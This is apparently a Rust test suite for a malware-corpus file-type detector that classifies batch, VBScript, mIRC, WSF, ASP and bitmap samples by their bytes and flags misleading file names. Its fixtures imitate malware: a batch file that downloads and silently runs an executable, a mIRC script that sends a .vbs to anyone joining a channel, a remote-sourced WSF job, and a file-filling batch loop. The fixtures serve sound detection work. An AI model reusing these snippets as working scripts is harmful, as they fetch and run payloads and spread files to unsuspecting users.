use super::*;

fn detected(path: &str, data: &[u8]) -> Detection {
    detect(Path::new(path), data).expect("detected")
}

fn file_type(path: &str, data: &[u8]) -> Option<FileType> {
    detect(Path::new(path), data).map(|d| d.file_type)
}

fn utf16le(text: &str, bom: bool) -> Vec<u8> {
    let mut out = if bom { vec![0xFF, 0xFE] } else { Vec::new() };
    out.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
    out
}

const BATCH: &[u8] = b"@echo off\r\nsetlocal\r\nset \"u=https://example.invalid/p.exe\"\r\n\
if not exist \"%TEMP%\\p.exe\" bitsadmin /transfer j /download %u% \"%TEMP%\\p.exe\"\r\n\
start \"\" /min \"%TEMP%\\p.exe\"\r\nexit /b\r\n";
const VBS: &[u8] =
    b"On Error Resume Next\r\nDim sh, fso\r\nSet sh = CreateObject(\"WScript.Shell\")\r\n\
Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\nIf fso.FileExists(\"c:\\p.exe\") Then\r\n\
  sh.Run \"c:\\p.exe\", 0, False\r\nEnd If\r\n";
const MIRC: &[u8] =
    b"on 1:JOIN:#:{\r\n  if ($nick != $me) { .dcc send $nick $mircdirx.vbs }\r\n}\r\n\
on 1:TEXT:!up:#:{ .msg $chan up $+ $uptime }\r\n";
const IRCII: &[u8] =
    b"# autogreet\r\n@ greet.count = 0\r\non #-join 42 \"*\" {\r\n\t@ greet.count++\r\n\
\t^msg $0 hello [$0]\r\n}\r\nalias greets xecho -b greeted $greet.count\r\n";

/// Corpora name samples by hash; there is nothing to go on but the bytes.
#[test]
fn hash_named_scripts_are_identified_by_content() {
    for (data, expected) in [
        (BATCH, FileType::Batch),
        (VBS, FileType::Vbs),
        (MIRC, FileType::Mirc),
        (IRCII, FileType::IrcII),
    ] {
        let d = detected("3f1997850e090823c14c458596e416ef", data);
        assert_eq!(d.file_type, expected);
        assert_eq!(d.source, DetectionSource::Heuristic);
        assert!(!d.extension_mismatch());
    }
}

/// A misleading name is recorded as a mismatch, not believed.
#[test]
fn misleading_names_are_contradicted() {
    for (name, data, expected) in [
        ("invoice.vbs", BATCH, FileType::Batch),
        ("run.bat", VBS, FileType::Vbs),
        ("script.mrc", IRCII, FileType::IrcII),
        ("readme.txt", VBS, FileType::Vbs),
        ("notes.md", MIRC, FileType::Mirc),
        ("photo.jpg.woff2", BATCH, FileType::Batch),
        ("Trojan.BAT.Looper.t", BATCH, FileType::Batch),
        ("Backdoor.IRC.Flood.lua", MIRC, FileType::Mirc),
    ] {
        let d = detected(name, data);
        assert_eq!(d.file_type, expected, "{name}");
        assert!(d.extension_mismatch(), "{name} should record the mismatch");
    }
}

/// Names that are right stay right, and one ambiguous line does not
/// overturn a name.
#[test]
fn names_that_fit_stand() {
    assert_eq!(file_type("run.cmd", BATCH), Some(FileType::Batch));
    assert_eq!(file_type("x.vbs", VBS), Some(FileType::Vbs));
    assert_eq!(file_type("bot.mrc", MIRC), Some(FileType::Mirc));
    // `msiexec /i URL` is as much PowerShell as batch.
    assert_eq!(
        file_type(
            "lure.ps1",
            b"msiexec /i https://example.invalid/verify/\r\n"
        ),
        Some(FileType::PowerShell)
    );
    // A `.bat` of a single `hello` line is still what cmd.exe would run.
    assert_eq!(file_type("x.bat", b"hello\r\n"), Some(FileType::Batch));
}

/// Windows scripts are routinely UTF-16, with or without a byte-order mark.
#[test]
fn utf16_scripts() {
    let vbs = std::str::from_utf8(VBS).unwrap();
    assert_eq!(
        file_type("sample", &utf16le(vbs, true)),
        Some(FileType::Vbs)
    );
    assert_eq!(
        file_type("sample", &utf16le(vbs, false)),
        Some(FileType::Vbs)
    );
    let mut be = vec![0xFE, 0xFF];
    be.extend(vbs.encode_utf16().flat_map(u16::to_be_bytes));
    assert_eq!(file_type("sample", &be), Some(FileType::Vbs));
    let batch = std::str::from_utf8(BATCH).unwrap();
    assert_eq!(
        file_type("sample.txt", &utf16le(batch, true)),
        Some(FileType::Batch)
    );
}

/// A UTF-16 mark in front of plain ASCII makes editors show CJK; cmd.exe
/// runs the batch anyway.
#[test]
fn utf16_mark_on_ascii_batch() {
    let mut data =
        b"\xff\xfe&cls\r\nstart \"\" /min \"C:\\Users\\Public\\x\\run.exe\" -c \"import os\"\r\n"
            .to_vec();
    data.push(0);
    assert_eq!(file_type("sample", &data), Some(FileType::Batch));
}

/// Windows Script Host documents are XML around the script they run.
#[test]
fn windows_script_host_documents() {
    let job = b"<job id=\"x\">\r\n<script language=\"VBScript\">\r\nSet s = CreateObject(\"WScript.Shell\")\r\n</script>\r\n</job>\r\n";
    let d = detected("sample", job);
    assert_eq!(d.file_type, FileType::Vbs);
    assert_eq!(d.source, DetectionSource::Magic);
    assert_eq!(file_type("manage-bde.wsf", b"<package>\n<job id=\"m\">\n<script language=\"VBScript\">\nx = 1\n</script>\n</job>\n</package>\n"), Some(FileType::Vbs));
    let prolog = b"<?xml version=\"1.0\" ?>\r\n<job id=\"Miliondelens\">\r\n<script \r\nlanguage=\"VBScript\">\r\nx = 1\r\n</script></job>\r\n";
    assert_eq!(file_type("x.wsf", prolog), Some(FileType::Vbs));
    // `VBScript` spelled in character references.
    let entities = b"\t\t<job>\r\n\t\t<script language\t =\t\"&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\" src=\"https://example.invalid/a.png\"/>\r\n</job>\r\n";
    assert_eq!(file_type("x.wsf", entities), Some(FileType::Vbs));
    let jscript = b"<?XML version=\"1.0\"?>\n<scriptlet>\n<registration progid=\"x\"/>\n<script language=\"JScript\">\nnew ActiveXObject(\"WScript.Shell\").Run(ps,0,true);\n</script>\n</scriptlet>\n";
    assert_eq!(file_type("sample", jscript), Some(FileType::JavaScript));
    let utf16 = utf16le(
        "<job id=\"a\">\r\n<script language=\"VBScript\">\r\nx = 1\r\n</script>\r\n</job>\r\n",
        true,
    );
    assert_eq!(file_type("x.wsf", &utf16), Some(FileType::Vbs));
    // An HTML page with a VBScript block is still the page.
    let page = b"<html><body><script language=\"VBScript\">MsgBox \"x\"</script></body></html>";
    assert_eq!(file_type("sample", page), Some(FileType::Html));
}

/// Script Encoder output hides the language; the name breaks the tie.
#[test]
fn encoded_scripts() {
    let encoded = b"#@~^3QAAAA==dK~}AN/tS^xkm]qaK ^\"2b:nr~L21OcJq?1DrwO UtnV^E#=r$%Ut+JscDi1vE1:[a0sAAA==^#~@";
    assert_eq!(file_type("c52bb2354e11.vbe", encoded), Some(FileType::Vbs));
    assert_eq!(file_type("sample", encoded), Some(FileType::Vbs));
    assert_eq!(file_type("x.jse", encoded), Some(FileType::JavaScript));
    // A comment that merely starts with the marker is not encoded.
    assert_ne!(
        file_type("sample", b"#@~^ not an encoded script\n"),
        Some(FileType::Vbs)
    );
}

#[test]
fn classic_asp_directives() {
    let page = b"<%@codepage=936%><%Response.Expires=0\r\non error resume next\r\n\
sub eg:Response.end:end sub\r\nfunction ee(g):response.write g:end function\r\n\
Dim co : co = Request.ServerVariables(\"URL\")\r\n%>\r\n";
    assert_eq!(file_type("Backdoor.ASP.Ace.t", page), Some(FileType::Asp));
    assert_eq!(file_type("sample", page), Some(FileType::Asp));
}

/// A batch file can open `<!-- :` to carry a WSF job; it is still batch.
#[test]
fn batch_wsf_hybrid_is_not_html() {
    let data = b"<!-- : Begin batch script\r\n@setlocal DisableDelayedExpansion\r\n@echo off\r\n\
cscript //nologo \"%~f0?.wsf\" //job:x\r\nexit /b\r\n----- Begin wsf script --->\r\n<package><job id=\"x\">\r\n\
<script language=\"VBScript\">\r\nWScript.Echo 1\r\n</script></job></package>\r\n";
    assert_eq!(file_type("convert-UUP.cmd", data), Some(FileType::Batch));
    assert_eq!(file_type("sample", data), Some(FileType::Batch));
    // Under a `.wsf` name the VBScript half is what runs.
    assert_eq!(file_type("convert-UUP.wsf", data), Some(FileType::Vbs));
}

/// A `.wsf` declares its own language; JScript in one is no masquerade.
#[test]
fn jscript_wsf_is_not_a_mismatch() {
    let job = b"<job><script language=\"JScript\">WScript.Echo(1);</script></job>";
    let id = FileId::from_path_and_bytes(Path::new("tool.wsf"), job);
    assert_eq!(id.file_type(), FileType::JavaScript);
    assert!(!id.extension_mismatch());
    // The same body under a `.vbs` name is one.
    let id = FileId::from_path_and_bytes(Path::new("tool.vbs"), job);
    assert!(id.extension_mismatch());
}

// ── Bitmaps ──────────────────────────────────────────────────────────

fn bmp(dib_size: u32, planes: u16, bits: u16) -> Vec<u8> {
    let mut out = b"BM".to_vec();
    out.extend_from_slice(&70u32.to_le_bytes());
    out.extend_from_slice(&[0, 0, 0, 0]);
    out.extend_from_slice(&(14 + dib_size).to_le_bytes());
    out.extend_from_slice(&dib_size.to_le_bytes());
    if dib_size == 12 {
        out.extend_from_slice(&2u16.to_le_bytes());
        out.extend_from_slice(&2u16.to_le_bytes());
    } else {
        out.extend_from_slice(&2i32.to_le_bytes());
        out.extend_from_slice(&(-2i32).to_le_bytes());
    }
    out.extend_from_slice(&planes.to_le_bytes());
    out.extend_from_slice(&bits.to_le_bytes());
    out.resize(70, 0);
    out
}

#[test]
fn bitmaps_by_header() {
    for dib in [12, 40, 56, 108, 124] {
        let d = detected("3f1997850e09", &bmp(dib, 1, 24));
        assert_eq!(d.file_type, FileType::Bmp, "info header size {dib}");
        assert_eq!(d.source, DetectionSource::Magic);
    }
    // A wrong file-size field is routine in real bitmaps.
    let mut truncated = bmp(40, 1, 8);
    truncated[2..6].copy_from_slice(&0x7ddd_ddddu32.to_le_bytes());
    assert_eq!(file_type("x", &truncated), Some(FileType::Bmp));
    // A bitmap under another name is a bitmap.
    let d = detected("invoice.pdf", &bmp(40, 1, 32));
    assert_eq!(d.file_type, FileType::Bmp);
    assert!(d.extension_mismatch());
}

/// `BM` is two letters. Without a real info header it is not a bitmap.
#[test]
fn bm_without_an_info_header_is_not_a_bitmap() {
    let mut junk = b"BM".to_vec();
    junk.extend_from_slice(&[
        0x90, 0x01, 0x00, 0x00, 0xAA, 0xBB, 0xCC, 0xDD, 0x36, 0x00, 0x00, 0x00,
    ]);
    junk.extend_from_slice(&[
        0x07, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    ]);
    junk.resize(200, 0x11);
    assert_ne!(file_type("sample", &junk), Some(FileType::Bmp));
    // Right header size, but three colour planes and a 7-bit depth.
    assert_ne!(file_type("sample", &bmp(40, 3, 24)), Some(FileType::Bmp));
    assert_ne!(file_type("sample", &bmp(40, 1, 7)), Some(FileType::Bmp));
}

/// The name alone does not make a bitmap.
#[test]
fn bmp_name_without_a_bitmap() {
    let random: Vec<u8> = (0..512u32)
        .map(|i| (i.wrapping_mul(2_654_435_761) >> 13) as u8)
        .collect();
    let d = detected("background.bmp", &random);
    assert_ne!(d.file_type, FileType::Bmp);
    assert!(d.extension_mismatch());
    assert_eq!(file_type("background.bmp", BATCH), Some(FileType::Batch));
    assert_eq!(
        file_type("notes.bmp", b"just some words\n"),
        Some(FileType::Text)
    );
    // An empty file has no bytes to argue with.
    assert_eq!(file_type("empty.bmp", b""), Some(FileType::Bmp));
}

/// A `.dib` may start at the info header, without the file header.
#[test]
fn headerless_dib() {
    let packed = bmp(40, 1, 24)[14..].to_vec();
    assert_eq!(file_type("clipboard.dib", &packed), Some(FileType::Bmp));
}

#[test]
fn html_rem_prologue_with_batch_body() {
    let data = b"<html>rem prologue\r\nrem notes\r\n@echo off\r\nset i=buffer\r\n:1\r\necho 0000>>data\r\ncopy /b data %i%\r\ncopy /b data+%i%\r\ngoto 1\r\n";
    for name in ["sample", "source.bat", "source.html"] {
        assert_eq!(file_type(name, data), Some(FileType::Batch));
    }
    let page = b"<html>rem tutorial\r\n<pre>\r\n@echo off\r\nset i=buffer\r\ncopy /b data %i%\r\ngoto 1\r\n</pre></html>";
    assert_eq!(file_type("source.html", page), Some(FileType::Html));
    assert_eq!(
        file_type(
            "sample",
            b"<html>remember this text\n@echo off\nset i=buffer\ncopy /b data %i%"
        ),
        Some(FileType::Html)
    );
}

#[test]
fn binary_batch_prologue_survives_registered_suffixes() {
    let mut bytes = b"@GOTO \xcc\r\nREM ".to_vec();
    bytes.extend_from_slice(&[0x90; 100]);
    bytes.extend_from_slice(b"\0\xb4\x4e\xcd\x21\xb4\x40\xcd\x21\r\n:\xcc\r\n@COPY %0 tmp.exe>NUL\r\n@tmp\r\n@DEL tmp.exe\r\n");
    for name in [
        "sample.bat",
        "sample.cmd",
        "sample.exe",
        "sample.com",
        "sample.txt",
        "sample.300",
    ] {
        assert_eq!(file_type(name, &bytes), Some(FileType::Batch), "{name}");
    }
}

#[test]
fn dos_binary_with_embedded_batch_text_keeps_binary_type() {
    let mut bytes = [0x90, 0, 1, 2].repeat(25);
    bytes.extend_from_slice(b"\xb4\x4e\xcd\x21\xb4\x40\xcd\x21");
    bytes.extend_from_slice(b"@echo off\r\ncopy %0 tmp.bat\r\nexit\r\n");
    for name in ["sample.bat", "sample.300"] {
        assert_eq!(file_type(name, &bytes), Some(FileType::DosCom), "{name}");
    }
}
